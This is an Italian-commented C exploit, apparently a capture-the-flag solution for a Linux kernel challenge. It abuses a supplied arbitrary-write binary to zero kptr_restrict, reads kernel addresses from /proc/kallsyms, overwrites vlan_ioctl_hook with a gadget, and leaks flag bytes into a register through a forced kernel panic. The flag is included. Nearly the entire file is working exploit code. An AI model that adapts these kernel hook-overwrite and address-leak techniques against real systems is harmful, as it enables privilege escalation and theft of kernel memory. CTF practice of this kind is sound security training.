// Author: Prosti
// LEGGERE PER CAPIRE L'EXPLOIT
// L'exploit causerà un kernel panic e leaka 4 byte della flag alla volta
// nel registro ECX.
// Per flaggare 4 byte dall'ottavo carattere della flag (per esempio), basta
// cambiare FLAG_CHAR_OFFSET a 8
#define FLAG_CHAR_OFFSET 0
///////////////////////////////////////////////////////////////////////////////
// FLAG: TRX{kallsyms_4_th3_w1n_32f9ec1f}                                    //
///////////////////////////////////////////////////////////////////////////////

#include "helpers.h"
#include <string.h>
#include <sys/socket.h>
#include <linux/netlink.h>

#define CHALL           "/usr/sbin/chall"
#define KPTR_RESTRICT   "/proc/sys/kernel/kptr_restrict"
#define KALLSYMS        "/proc/kallsyms"

#define CONFIG_PHYSICAL_START   0x1000000
#define CONFIG_PHYSICAL_ALIGN   0x0200000
#define KPTR_RESTRICT_OFFSET    0x1ff49e0

#define LEAK_GADGET             0x03bddd1 // 0xffffffff813bddd1: mov ecx, [rsi]; iretd;
#define FLAG_OFFSET             0x2fb5000

#define VLAN_IOCTL_HOOK_OFFSET  0x2b8ce50
#define SIOCGIFVLAN             0x0008982

__attribute__((constructor)) 
void init(){
    setbuf(stdout, NULL);
    setbuf(stderr, NULL);
    setbuf(stdin, NULL);
}

int kwrite(unsigned long address, unsigned long value){
    char* s = calloc(0x40, 1);
    sprintf(s, CHALL " 0x%lx 0x%lx", address, value);
    return system(s);
}

int check_kptr_restrict(){
    int r;
    FILE* f;
    f = fopen(KPTR_RESTRICT, "rb");
    fscanf(f, "%d", &r);
    fclose(f);
    return r;
}

unsigned long get_kbase(){
    FILE* f;
    char* line, trash, search;
    size_t sz;
    unsigned long address;
    char symbol[0x100] = {0};

    f = fopen(KALLSYMS, "r");
    search = 1;

    do{
        line = NULL;
        sz = 0;

        if(getline(&line, &sz, f) == -1) {
            search = 0;
        } else {
            sscanf(line, "%lx %c %s", &address, &trash, symbol);
            if(strcmp(symbol, "_text") == 0)
                search = 0;
        }

    } while(search);

    return address;
}

int main(){
    unsigned long phys_kbase, kbase;
    int r, success, soc;

    for(phys_kbase = CONFIG_PHYSICAL_START + CONFIG_PHYSICAL_ALIGN * 0x1d0, success = 0; phys_kbase >= CONFIG_PHYSICAL_START && phys_kbase && !success; phys_kbase -= CONFIG_PHYSICAL_ALIGN){
        printf("address: %p\n", phys_kbase + KPTR_RESTRICT_OFFSET);
        kwrite(phys_kbase + KPTR_RESTRICT_OFFSET, 0);
        if(check_kptr_restrict() == 0){
            success = 1;
            break;
        }
    }

    if(!success){
        puts("exploit failed");
        return 1;
    }

    kbase = get_kbase();
    printf("kbase @ %p\n", kbase);

    hlt("overwrite vlan_ioctl_hook");
    kwrite(phys_kbase + VLAN_IOCTL_HOOK_OFFSET, kbase + LEAK_GADGET);

    hlt("create socket");
    soc = socket(AF_NETLINK, SOCK_RAW, NETLINK_ROUTE);
    if(soc == -1)
        err(1, "could not create socket");


    hlt("excecute vlan_ioctl_hook");

    if(ioctl(soc, SIOCGIFVLAN, kbase + FLAG_OFFSET + FLAG_CHAR_OFFSET) != 0)
        err(1, "ioctl failed");

    hlt("end of exploit");

    return 0;
}